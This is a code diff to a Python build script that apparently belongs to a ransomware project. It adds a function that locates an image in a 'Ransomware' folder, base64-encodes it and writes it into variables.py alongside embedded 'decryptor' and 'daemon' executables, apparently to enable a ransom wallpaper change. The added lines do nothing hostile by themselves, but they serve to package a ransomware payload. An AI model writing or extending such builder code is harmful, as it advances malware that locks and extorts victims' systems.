@@ -123,6 +123,36 @@ def build_daemon():
     print("Building daemon...")
     return build('daemon')
 
+def encode_image_to_base64(image_path=None):
+    """Encode image to base64 and update variables.py"""
+    print("Encoding image to base64...")
+    
+    # If no image path specified, look in standard locations
+    if not image_path:
+        possible_paths = [
+            os.path.join(os.getcwd(), "Ransomware", "img.png"),
+            os.path.join(os.getcwd(), "img.png"),
+            os.path.join(os.path.dirname(os.getcwd()), "img.png")
+        ]
+        
+        for path in possible_paths:
+            if os.path.exists(path):
+                image_path = path
+                print(f"Found image at: {image_path}")
+                break
+    
+    if not image_path or not os.path.exists(image_path):
+        print("No image file found. Wallpaper change feature will not work.")
+        return None
+    
+    # Read the image file and encode to base64
+    try:
+        with open(image_path, "rb") as image_file:
+            encoded_string = base64.b64encode(image_file.read())
+            return encoded_string
+    except Exception as e:
+        print(f"Error encoding image: {str(e)}")
+        return None
 
 def update_variables_file():
     """Update variables.py with base64 encoded executables"""
@@ -145,6 +175,9 @@ def update_variables_file():
     except Exception as e:
         error(f"Could not read base64 files: {str(e)}")
     
+    # Encode image to base64
+    img_base64 = encode_image_to_base64()
+
     # Read the variables file
     with open(variables_path, "r") as f:
         content = f.readlines()
@@ -157,6 +190,8 @@ def update_variables_file():
             content[i] = f'decryptor = b"""{decryptor_base64}"""\n'
         elif line.startswith("daemon ="):
             content[i] = f'daemon = b"""{daemon_base64}"""\n'
+        elif line.startswith("img =") and img_base64:
+            content[i] = f'img = b"""{img_base64.decode("utf-8")}"""\n'
     
     # Write back to the file
     with open(variables_path, "w") as f:
